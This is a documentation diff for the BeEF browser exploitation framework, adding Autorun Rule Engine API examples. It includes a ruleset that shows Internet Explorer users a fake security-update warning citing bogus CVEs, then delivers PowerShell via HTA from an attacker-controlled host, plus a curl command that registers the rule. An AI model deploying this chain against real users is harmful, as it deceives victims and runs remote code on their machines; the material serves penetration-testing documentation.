@@ -194,7 +194,54 @@ autorun:
 ```
 
 ## RESTful API
-TODO add/delete/list rule, trigger rule
+For easier integration with other tools or with your custom scripts, RESTful APIs are available also for the Autorun Rule Engine.
 
+### Add rule
+Ruleset (ie_win_htapowershell.json):
+```javascript
+{
+  "name": "HTA PowerShell",
+  "author": "antisnatchor",
+  "browser": "IE",
+  "browser_version": "ALL",
+  "os": "Windows",
+  "os_version": ">= 7",
+  "modules": [
+    {
+      "name": "fake_notification_ie",
+      "condition": null,
+      "options": {
+        "notification_text":"Internet Explorer SECURITY NOTIFICATION: your browser is outdated and vulnerable to critical security vulnerabilities like CVE-2015-009 and CVE-2014-879. Please apply the Microsoft Update below:"
+      }
+    },
+    {
+      "name": "hta_powershell",
+      "condition": null,
+      "options": {
+        "domain":"http://172.16.45.1:3000",
+        "ps_url":"/ps"
+      }
+    }],
+  "execution_order": [0,1],
+  "execution_delay": [0,500],
+  "chain_mode": "sequential"
+}
+```
+You can add it to BeEF with the following cURL request:
+```javascript
+curl -H "Content-Type: application/json; charset=UTF-8" --data "@ie_win_htapowershell.json" -X POST http://172.16.45.1:3000/api/autorun/rule/add?token=xyz
+```
+### Trigger rule
+```javascript
+
+```
+### Delete rule
+```javascript
+
+```
+### List rule(s)
+```javascript
+
+```
 ## Rules examples:
 TODO various examples from public rules
